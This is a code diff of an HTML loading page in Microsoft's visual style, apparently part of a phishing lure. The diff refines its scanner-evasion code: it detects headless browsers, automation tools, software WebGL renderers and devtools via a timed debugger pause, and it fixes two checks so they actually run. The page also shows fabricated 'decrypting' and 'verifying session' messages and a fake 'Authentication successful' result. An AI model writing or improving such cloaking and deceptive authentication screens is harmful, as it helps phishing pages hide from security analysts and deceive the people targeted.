@@ -7,15 +7,11 @@
 
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            display:flex; justify-content:center; align-items:center;
-            height:100vh; background-color:#f3f2f1; margin:0; overflow:hidden;
-        }
+        body { font-family:'Segoe UI',Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f3f2f1; margin:0; overflow:hidden; }
         .loading-container { text-align:center; max-width:420px; padding:20px; }
         .status-container { margin-top:40px; min-height:120px; }
         .progress-bar { width:100%; height:4px; background:#e1dfdd; border-radius:2px; overflow:hidden; margin-bottom:20px; }
-        .progress-fill { height:100%; background:linear-gradient(90deg, #0078d4, #106ebe); width:0%; transition:width 0.8s ease; box-shadow:0 0 10px rgba(0,120,212,0.3); }
+        .progress-fill { height:100%; background:linear-gradient(90deg,#0078d4,#106ebe); width:0%; transition:width 0.8s ease; box-shadow:0 0 10px rgba(0,120,212,0.3); }
         .progress-fill.completed { width:100% !important; transition:none !important; }
         .status-message { font-size:18px; color:#323130; margin-bottom:10px; opacity:0; transform:translateY(20px); transition:all 0.5s ease; font-weight:500; }
         .status-message.active { opacity:1; transform:translateY(0); }
@@ -37,19 +33,12 @@
     </div>
 
     <script>
-        // ────────────────────────────────────────────────
-        // Bot / automation detection (passive, no user prompt)
-        // ────────────────────────────────────────────────
         function isLikelyBot() {
             const checks = [
-                // Headless browsers usually set this
                 navigator.webdriver === true,
-                // Missing in many headless/automation setups
                 !window.chrome || typeof window.chrome.app === 'undefined',
-                // Common in Playwright/Puppeteer without stealth
                 navigator.languages === undefined || navigator.languages.length === 0,
-                // Software rendering common in sandboxes/headless
-                () => {
+                (() => {
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                     if (!gl) return false;
@@ -57,41 +46,31 @@
                     if (!debug) return false;
                     const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || '';
                     return /swiftshader|software|llvmpipe/i.test(renderer);
-                },
-                // Very basic timing check for devtools/slow environments
-                () => {
+                })(),
+                (() => {
                     const start = performance.now();
-                    debugger; // pauses if devtools open
+                    debugger;
                     const end = performance.now();
                     return end - start > 150;
-                }()
+                })()
             ];
-
-            // If 3 or more checks fail → likely bot
             return checks.filter(Boolean).length >= 3;
         }
 
         const botDetected = isLikelyBot();
 
-        // ────────────────────────────────────────────────
-        // Loading sequence
-        // ────────────────────────────────────────────────
         const loadingSequence = [
             { message: "Retrieving account details...", detail: "Fetching encrypted user metadata...", progress: 30, duration: 1200 },
             { message: "Decrypting secure message...", detail: "AES-256-GCM decryption in progress...", progress: 55, duration: 1400 },
             { message: "Verifying your session...", detail: "Validating session integrity...", progress: 100, duration: 1600 }
         ];
 
-        let currentStep = 0;
-        let isLoading = false;
-        let sequenceCompleted = false;
+        let currentStep = 0, isLoading = false, sequenceCompleted = false;
 
         function showError(msg) {
-            const status = document.getElementById('statusMessage');
-            const details = document.getElementById('cryptoDetails');
-            status.textContent = msg;
-            status.classList.add('active', 'error');
-            details.textContent = "";
+            document.getElementById('statusMessage').textContent = msg;
+            document.getElementById('statusMessage').classList.add('active', 'error');
+            document.getElementById('cryptoDetails').textContent = "";
         }
 
         function updateLoadingStep() {
@@ -112,10 +91,7 @@
         }
 
         function completeLoading() {
-            const status = document.getElementById('statusMessage');
-            const details = document.getElementById('cryptoDetails');
             const progress = document.getElementById('progressFill');
-
             progress.classList.add('completed');
             sequenceCompleted = true;
 
@@ -124,6 +100,8 @@
                 return;
             }
 
+            const status = document.getElementById('statusMessage');
+            const details = document.getElementById('cryptoDetails');
             status.textContent = "Authentication successful";
             status.classList.add('active', 'success');
             details.textContent = "Session verified. You may now close this window.";
@@ -138,10 +116,7 @@
             setTimeout(updateLoadingStep, 1000);
         }
 
-        // Start on load
-        window.addEventListener('load', () => {
-            setTimeout(startLoginSequence, 800);
-        });
+        window.addEventListener('load', () => setTimeout(startLoginSequence, 800));
     </script>
 </body>
 </html>
